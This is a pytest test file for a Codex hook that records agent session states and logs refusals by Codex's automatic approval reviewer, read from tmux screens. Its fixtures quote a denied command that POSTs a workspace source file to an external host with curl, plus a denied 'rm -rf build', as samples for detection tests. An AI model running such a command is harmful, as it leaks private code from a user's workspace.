"""The shipped Codex hook (stdlib-only script): Codex events → shared states."""

from __future__ import annotations

import io
import json
from unittest.mock import patch

import pytest

from agent_backbone.hooks import backbone_state as bb
from agent_backbone.hooks import codex_hook as hook
from agent_backbone.services.agents._file_reader import read_state_file
from agent_backbone.services.agents.models import AgentState


def _payload(event: str, **extra) -> dict:
    return {"hook_event_name": event, "session_id": "01a0-codex", "cwd": "/tmp", **extra}


@pytest.fixture(autouse=True)
def _no_backbone_env(monkeypatch):
    monkeypatch.delenv("BACKBONE_STATE_DIR", raising=False)


def test_a_new_codex_session_does_not_inherit_the_previous_claude_model(monkeypatch):
    monkeypatch.setenv("BACKBONE_RUNTIME", "codex")
    claude = {
        "state": "idle",
        "session_id": "c1-claude",
        "runtime": "claude",
        "model": "claude-opus-5",
    }
    record, _ = hook.derive(_payload("SessionStart"), claude)
    assert "model" not in record and record["runtime"] == "codex"
    record["model"] = "gpt-6-astra"  # observed in this session: carried within it
    later, _ = hook.derive(_payload("PreToolUse"), record)
    assert later["model"] == "gpt-6-astra"


@pytest.mark.parametrize("event", ["SessionStart", "UserPromptSubmit", "Stop"])
def test_the_running_model_comes_from_the_codex_payload(event):
    """Codex's hook payload names the model (captured live, codex 0.156.1)."""
    record, _ = hook.derive(_payload(event, model="gpt-6-sol"), None)
    assert record["model"] == "gpt-6-sol"


class TestDerive:
    @pytest.mark.parametrize(
        ("event", "expected"),
        [
            ("SessionStart", bb.STATE_IDLE),
            ("UserPromptSubmit", bb.STATE_BUSY),
            ("PreToolUse", bb.STATE_BUSY),
            ("Stop", bb.STATE_IDLE),
            ("Interrupt", bb.STATE_IDLE),
            ("SessionEnd", bb.STATE_UNKNOWN),
        ],
    )
    def test_states(self, event, expected):
        record, action = hook.derive(_payload(event), None)
        assert record["state"] == expected and action is None
        assert record["event"] == event and record["session_id"] == "01a0-codex"

    def test_permission_request_is_waiting(self):
        record, _ = hook.derive(_payload("PermissionRequest", tool_name="Bash"), None)
        assert record["state"] == bb.STATE_WAITING and record["reason"] == bb.REASON_PERMISSION

    def test_stop_keeps_the_last_message_clipped(self):
        record, _ = hook.derive(_payload("Stop", last_assistant_message="x" * 600), None)
        assert record["last_message"].startswith("x" * 500) and len(record["last_message"]) == 501
        later, _ = hook.derive(_payload("PreToolUse"), record)
        assert later["last_message"] == record["last_message"]  # carried until the next Stop

    def test_issue_from_prompt_survives_later_events(self):
        record, _ = hook.derive(_payload("UserPromptSubmit", prompt="work on acme/app#7"), None)
        assert (record["issue"], record["repo"]) == (7, "acme/app")
        later, _ = hook.derive(_payload("Stop"), record)
        assert (later["issue"], later["repo"]) == (7, "acme/app")

    @pytest.mark.parametrize(
        ("tool_input", "issue"),
        [
            ({"command": "gh issue comment 17 --body done"}, 17),
            ({"command": ["gh", "issue", "comment", "9", "-R", "a/b", "-b", "x"]}, 9),
            ({"command": "ls"}, None),
        ],
    )
    def test_comment_actions(self, tool_input, issue):
        record, actions = hook.derive(
            _payload("PreToolUse", tool_name="Bash", tool_input=tool_input), None
        )
        assert record["state"] == "busy"  # a tool is about to run
        assert (actions[0]["issue"] if actions else None) == issue

    def test_unknown_events_write_nothing(self):
        assert hook.derive(_payload("SubagentStart"), None) == (None, None)


class TestAHookNeverFailsTheCli:
    def test_an_unexpected_payload_shape_exits_zero(self, tmp_path):
        payload = _payload("PreToolUse", tool_name="Bash", tool_input=["not", "a", "dict"])
        with patch.object(bb.sys, "stdin", io.StringIO(json.dumps(payload))):
            assert hook.main(["--state-dir", str(tmp_path), "--agent", "cx"]) == 0

    def test_a_prompt_that_is_not_a_string_exits_zero(self, tmp_path):
        payload = _payload("UserPromptSubmit", prompt={"weird": True})
        with patch.object(bb.sys, "stdin", io.StringIO(json.dumps(payload))):
            assert hook.main(["--state-dir", str(tmp_path), "--agent", "cx"]) == 0


class TestMainWritesStateTheBackboneReads:
    def test_roundtrip_with_file_reader(self, tmp_path):
        payload = _payload("Stop", last_assistant_message="Done.")
        with patch.object(bb.sys, "stdin", io.StringIO(json.dumps(payload))):
            assert hook.main(["--state-dir", str(tmp_path), "--agent", "cx"]) == 0
        snapshot = read_state_file(tmp_path, "cx")
        assert snapshot.state == AgentState.IDLE
        assert snapshot.session_id == "01a0-codex"
        assert snapshot.last_message == "Done."
        assert snapshot.event == "Stop"
        assert "event Stop" in snapshot.evidence[0]


class TestActionsAreLoggedBeforeAndAfter:
    def test_post_tool_use_logs_the_same_shell_actions(self):
        payload = _payload(
            "PostToolUse",
            tool_name="Bash",
            tool_input={"command": "gh issue comment 5 -b ok"},
            tool_response={"exit_code": 0, "output": "created"},
        )
        record, actions = hook.derive(payload, None)
        assert record is None and actions and actions[0]["issue"] == 5


# Codex 0.157.1's own TUI snapshots of the automatic reviewer's refusals
# (codex-rs/tui/src/chatwidget/snapshots/…guardian_denied_exec… and …timed_out_exec…).
REVIEWING = """\
• Ran git status
  └ On branch main

• Working (0s • esc to interrupt)


› Ask Codex to do anything
"""
DENIED = """\
⚠ Automatic approval review denied (risk: high): The planned action would
  transmit the full contents of a workspace source file (`core/src/codex.rs`) to
  `https://example.com`, which is an external and untrusted endpoint.

✗ Request denied for codex to run curl -sS -i -X POST --data-binary
  @core/src/codex.rs https://example.com

• Working (0s • esc to interrupt)


› Ask Codex to do anything
"""
TIMED_OUT = """\
⚠ Automatic approval review timed out while evaluating the requested approval.

✗ Review timed out before codex could run curl -sS -i -X POST --data-binary
  @core/src/codex.rs https://example.com
"""


class TestAutomaticReviewerRefusals:
    """Codex's reviewer refuses without a dialog or hook event; its screen entry is logged."""

    @pytest.fixture(autouse=True)
    def _in_a_pane(self, monkeypatch):
        monkeypatch.setenv("TMUX_PANE", "%1")  # every screen read below is mocked

    def _turn(self, tmp_path, *screens, events=("PermissionRequest", "PreToolUse")):
        with patch.object(hook, "own_screen", side_effect=list(screens)) as look:
            for event in events:
                hook.watch_refusals(_payload(event, tool_name="Bash"), tmp_path, "cx")
        log = tmp_path / "actions.jsonl"
        logged = [json.loads(line) for line in log.read_text().splitlines()] if log.exists() else []
        return logged, look

    def _watch(self, tmp_path) -> dict:
        return json.loads((tmp_path / hook.WATCH_DIR / "cx.json").read_text())

    def test_a_refusal_is_logged_with_program_names_only(self, tmp_path):
        [refusal], _ = self._turn(tmp_path, REVIEWING, REVIEWING + DENIED)
        assert refusal["action"] == "permission_denied" and refusal["kind"] == "auto_review"
        assert refusal["category"] == "risk: high" and refusal["summary"] == "curl"
        assert refusal["session"] == "cx"
        logged = json.dumps(refusal)
        assert "example.com" not in logged and "codex.rs" not in logged

    def test_a_timed_out_review_is_a_refusal_too(self, tmp_path):
        [refusal], _ = self._turn(tmp_path, REVIEWING, TIMED_OUT)
        assert refusal["category"] == "review timed out" and refusal["summary"] == "curl"

    def test_a_marker_wrapped_in_a_narrow_pane_is_still_read(self, tmp_path):
        narrow = "✗ Review timed out before\n  codex could run git push\n"
        [refusal], _ = self._turn(tmp_path, REVIEWING, narrow)
        assert refusal["category"] == "review timed out" and refusal["summary"] == "git push"

    @pytest.mark.parametrize(
        "line",
        [
            "✔ Auto-reviewer approved codex to run git push this time",
            "✗ You did not approve codex to run git push",  # a person's own answer
            "  ✗ Request denied for codex to run git push",  # quoted inside other output
        ],
    )
    def test_other_lines_are_not_refusals(self, tmp_path, line):
        assert self._turn(tmp_path, REVIEWING, REVIEWING + line + "\n")[0] == []

    def test_a_refusal_already_on_screen_is_not_reported_again(self, tmp_path):
        logged, _ = self._turn(
            tmp_path,
            DENIED,
            DENIED + REVIEWING,
            DENIED + REVIEWING + DENIED,
            events=("PermissionRequest", "PreToolUse", "Stop"),
        )
        assert len(logged) == 1  # the second one only

    @pytest.mark.parametrize(
        "rewrapped",
        [
            DENIED.replace("--data-binary\n  @core", "\n  --data-binary @core"),  # between words
            DENIED.replace("@core/src/codex.rs", "@core/src/co\n  dex.rs"),  # inside a word
        ],
    )
    def test_a_rewrapped_screen_shows_the_same_refusal(self, tmp_path, rewrapped):
        assert self._turn(tmp_path, DENIED, rewrapped)[0] == []

    def test_a_refusal_that_scrolled_away_does_not_hide_a_new_one(self, tmp_path):
        first = "✗ Request denied for codex to run git push\n"
        second = "✗ Request denied for codex to run gh issue edit 4\n"
        third = "✗ Request denied for codex to run rm -rf build\n"
        logged, _ = self._turn(tmp_path, first + second, second + third)
        assert [refusal["summary"] for refusal in logged] == ["rm"]

    def test_the_watch_ends_with_the_turn(self, tmp_path):
        _, look = self._turn(
            tmp_path, REVIEWING, REVIEWING, events=("PermissionRequest", "Stop", "PreToolUse")
        )
        assert look.call_count == 2 and self._watch(tmp_path)["watching"] is False

    def test_a_screen_that_cannot_be_read_waits_for_the_next_look(self, tmp_path):
        logged, look = self._turn(
            tmp_path,
            REVIEWING,
            None,  # the turn's end: tmux did not answer
            DENIED,
            events=("PermissionRequest", "Stop", "UserPromptSubmit"),
        )
        assert look.call_count == 3 and len(logged) == 1

    def test_a_failed_first_look_compares_with_the_sessions_start(self, tmp_path):
        logged, _ = self._turn(
            tmp_path,
            REVIEWING,
            None,  # the approval request: tmux did not answer
            REVIEWING + DENIED,
            events=("SessionStart", "PermissionRequest", "PreToolUse"),
        )
        assert [refusal["summary"] for refusal in logged] == ["curl"]

    def test_an_unknown_earlier_screen_is_never_reported(self, tmp_path):
        logged, _ = self._turn(tmp_path, None, DENIED, events=("PermissionRequest", "PreToolUse"))
        assert logged == [] and self._watch(tmp_path)["seen"]  # now the baseline

    def test_there_is_no_look_without_a_permission_request(self, tmp_path):
        logged, look = self._turn(
            tmp_path, REVIEWING, events=("PreToolUse", "Stop", "PermissionRequest")
        )
        assert look.call_count == 1 and logged == []

    def test_a_new_session_ends_the_watch(self, tmp_path):
        _, look = self._turn(
            tmp_path,
            REVIEWING,
            REVIEWING,
            events=("PermissionRequest", "SessionStart", "PreToolUse"),
        )
        assert look.call_count == 2 and self._watch(tmp_path)["watching"] is False

    def test_the_state_record_does_not_carry_the_watch(self, tmp_path):
        """Hooks of parallel calls rewrite the state record; the watch is not in it."""
        self._turn(tmp_path, REVIEWING, events=("PermissionRequest",))
        record, _ = hook.derive(_payload("PreToolUse"), {"state": "busy"})
        assert "refusal_watch" not in record and self._watch(tmp_path)["watching"]

    def test_outside_tmux_nothing_is_watched(self, tmp_path, monkeypatch):
        monkeypatch.delenv("TMUX_PANE")
        monkeypatch.setenv("TMUX", "/tmp/tmux-1/default")
        assert hook.own_screen() is None  # no pane of its own
        hook.watch_refusals(_payload("PermissionRequest"), tmp_path, "cx")
        assert not (tmp_path / hook.WATCH_DIR).exists()

    def test_the_hook_reads_all_of_its_own_pane(self, monkeypatch):
        monkeypatch.setenv("TMUX", "/tmp/tmux-1/default")
        monkeypatch.setenv("TMUX_PANE", "%7")
        done = hook.bb.subprocess.CompletedProcess([], 0, stdout=DENIED.encode())
        with patch.object(hook.bb.subprocess, "run", return_value=done) as run:
            assert hook.own_screen() == DENIED
        argv = run.call_args.args[0]
        assert argv[:2] == ["tmux", "capture-pane"] and argv[-4:] == ["-t", "%7", "-S", "-"]
        assert "-J" in argv  # wrapped lines joined

    def test_a_refusal_reaches_the_action_log_through_the_hook(self, tmp_path):
        for event, screen in (("PermissionRequest", REVIEWING), ("Stop", DENIED)):
            payload = io.StringIO(json.dumps(_payload(event, tool_name="Bash")))
            with patch.object(hook, "own_screen", return_value=screen):
                with patch.object(bb.sys, "stdin", payload):
                    assert hook.main(["--state-dir", str(tmp_path), "--agent", "cx"]) == 0
        [line] = (tmp_path / "actions.jsonl").read_text().splitlines()
        assert json.loads(line)["summary"] == "curl"


@pytest.mark.parametrize(
    ("what", "summary"),
    [
        ("run git push origin main", "git push"),
        ("run ./deploy-private.sh --token x", "a local command"),
        ("apply a patch touching src/private.py", "apply_patch"),
        ("call MCP tool github.create_issue", "github: create_issue"),
        ("call MCP tool odd server.tool name", "an MCP tool"),
        ("access private-host.example:443", "network access"),
        ('send input to terminal 42: "secret"', "input to a running command"),
        ("request permissions: read ~/private", "a permission request"),
        ("", "an action"),
    ],
)
def test_a_refusal_is_named_without_its_arguments(what, summary):
    assert hook.refusal_summary(what) == summary
